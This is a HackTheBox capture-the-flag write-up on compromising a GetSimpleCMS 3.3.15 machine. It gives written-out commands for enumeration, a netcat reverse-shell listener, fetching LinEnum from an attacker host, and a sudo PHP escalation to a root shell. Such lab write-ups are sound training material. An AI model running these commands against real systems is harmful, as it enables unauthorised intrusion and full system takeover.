# Day17 - getsimplecms_box

- **Platform**: HackTheBox  
- **Category**: Web / Privilege Escalation  
- **Difficulty**: Medium  
- **Date**: 2025-05-16  
- **Tools Used**: Nmap, Gobuster, Hashcat, Firefox, GitHub exploit, Netcat, LinEnum  

---

## Summary
The target machine ran GetSimpleCMS 3.3.15, a web application vulnerable to remote code execution through its theme upload feature. After retrieving admin credentials from an exposed XML file, I exploited a public RCE PoC to gain a shell. Privilege escalation was achieved by abusing a `sudo` misconfiguration that allowed running PHP as root without a password, ultimately retrieving the `root.txt` flag.

---

## Enumeration
1. **Port Scanning**  
   - Ran Nmap:
     ```bash
     nmap -sC -sV -oA nmap/initial 10.10.10.123
     ```
   - Found open ports:  
     - 80 (HTTP)  
     - 22 (SSH)  

2. **Directory Discovery**  
   - Used Gobuster:
     ```bash
     gobuster dir -u http://10.10.10.123/ \
       -w /usr/share/wordlists/dirb/common.txt \
       -x php,html,txt,bak -o gobuster/root.txt
     ```
   - Discovered `/admin/` login page.  

3. **Credential Discovery**  
   - Found exposed XML file at `/data/users.xml` containing hashed credentials:
     ```xml
     <user>
       <username>admin</username>
       <password>d033e22ae348aeb5660fc2140aec35850c4da997</password>
     </user>
     ```
   - Hash recognized as SHA-1 for `admin`.  
   - Logged into `/admin/` with `admin:admin`.  

4. **Vulnerability Research**  
   - Identified GetSimpleCMS 3.3.15 vulnerable to RCE via theme upload (CVE documented online).  
   - Found public PoC:  
     https://github.com/cybersecaware/GetSimpleCMS-RCE/tree/main  

---

## Exploitation
1. **RCE via Theme Upload**  
   - Cloned PoC exploit.  
   - Set up reverse shell listener:
     ```bash
     busybox nc -l -p 9001 -e /bin/sh
     ```
   - Executed exploit against target with payload to connect back.  
   - Gained shell as `www-data`.  

2. **Privilege Escalation**  
   - Uploaded and ran LinEnum:
     ```bash
     wget http://10.10.14.5/linenum.sh
     chmod +x linenum.sh
     ./linenum.sh | tee linenum.log
     ```
   - Found `/usr/bin/php` could be run as root via `sudo` without a password.  
   - Spawned root shell:
     ```bash
     CMD="/bin/sh"
     sudo /usr/bin/php -r "system('$CMD');"
     ```
   - Verified escalation with `whoami -> root`.  

3. **Flag Retrieval**  
   ```bash
   find / -name root.txt 2>/dev/null
   cat /root/root.txt
   ```

---

## Lessons Learned
- Directory and file brute-forcing often reveals sensitive configuration files.  
- Public CVEs and GitHub PoCs can be leveraged to shortcut exploitation of known vulnerable applications.  
- Privilege escalation often comes down to `sudo` misconfigurations; always check `sudo -l`.  
- Combining multiple simple misconfigurations (exposed files + weak hash + RCE + sudo misconfig) leads to full system compromise.  
